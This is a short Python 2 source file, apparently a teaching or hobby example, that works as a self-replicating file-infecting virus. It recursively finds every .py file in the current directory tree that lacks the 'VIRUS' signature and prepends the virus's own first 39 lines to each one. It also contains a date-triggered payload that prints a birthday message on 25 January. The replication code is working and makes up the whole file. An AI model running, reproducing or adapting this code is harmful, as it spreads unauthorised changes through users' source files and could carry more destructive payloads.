import os
import datetime
FIRMA = "VIRUS"

def search(path):
    infectados = []
    archivos = os.listdir(path)
    for nombre in archivos:
        if os.path.isdir(path+"/"+nombre):
            infectados.extend(search(path+"/"+nombre))
        elif nombre[-3:] == ".py":
            virus = False
            for line in open(path+"/"+nombre):
                if FIRMA in line:
                    virus = True
                    break
            if virus == False:
                infectados.append(path+"/"+nombre)
    return infectados
def infect(infectados):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for nombre in infectados:
        f = open(nombre)
        temp = f.read()
        f.close()
        f = open(nombre,"w")
        f.write(virusstring + temp)
        f.close()

def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print "HAPPY BIRTHDAY!"

infectados = search(os.path.abspath(""))
infect(infectados)
bomb()
